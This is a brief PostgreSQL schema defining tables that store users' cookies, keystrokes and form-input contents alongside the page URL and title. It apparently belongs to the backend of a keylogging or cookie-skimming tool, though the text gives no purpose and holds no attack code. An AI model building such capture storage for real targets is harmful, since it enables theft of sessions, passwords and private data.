/* Database Schema - PostgreSQL 11 */

CREATE TABLE Users (
    id SERIAL PRIMARY KEY
);

CREATE TABLE Cookies (
    uid INTEGER References Users(id),
    timestamp DATE,
    url TEXT,
    title TEXT,
    cookie TEXT
);


CREATE TABLE Keystrokes (
    uid INTEGER References Users(id),
    timestamp DATE,
    url TEXT,
    title TEXT,
    content TEXT
);

CREATE TABLE Inputs (
    uid INTEGER References Users(id),
    timestamp DATE,
    url TEXT,
    title TEXT,
    type TEXT, -- input field type
    content TEXT -- input field contents
);